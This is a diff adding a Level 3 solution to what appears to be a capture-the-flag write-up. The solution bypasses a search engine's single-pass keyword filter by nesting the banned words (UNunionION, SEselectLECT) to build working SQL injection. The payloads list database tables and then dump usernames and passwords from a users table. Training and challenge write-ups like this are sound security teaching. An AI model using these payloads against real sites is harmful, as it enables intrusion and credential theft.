@@ -60,4 +60,32 @@ Solution:----------------------------------------------------------------------
 
 ###############################################################################
 Level 3
-###############################################################################
+##############################################################################
+  The search engine tries to filter words, but we can get around this because we
+  know how they are filtering:
+
+    $_GET['q'] = preg_replace('/' . $banned . '/i', '', $_GET['q']);
+
+  This is just commenting out the banned parts. So lets put the banned words 
+  (union and select) inside themselves. Union becomes UNunionION and select
+  becomes SEselectLECT. Now we can use these banned words into the query:
+
+    SELECT * FROM search_engine WHERE title LIKE '%" . $_GET['q'].  "%' OR 
+      description LIKE '%" . $_GET['q'] .  "%' OR link LIKE '%" . $_GET['q'] . 
+      "%';
+
+  We can abuse this query like this to get the table names:
+
+    greatest%' UNUNIONION (SESELECTLECT TABLE_NAME,TABLE_SCHEMA,3 FROM 
+     information_schema.tables);-- %';
+
+  This query reveals a useful table. The users table might have good info in it.
+  With a little intelligent guessing of what the flag might be (username
+  password) we ca can grab the fields and get the flag:
+
+    greatest%' UNUNIONION (SESELECTLECT users.username, users.password,3 FROM 
+      users);-- %';
+
+Solution:----------------------------------------------------------------------
+  greatest%' UNunionION (SEselectLECT users.username, users.password,3 FROM 
+    users);-- %';
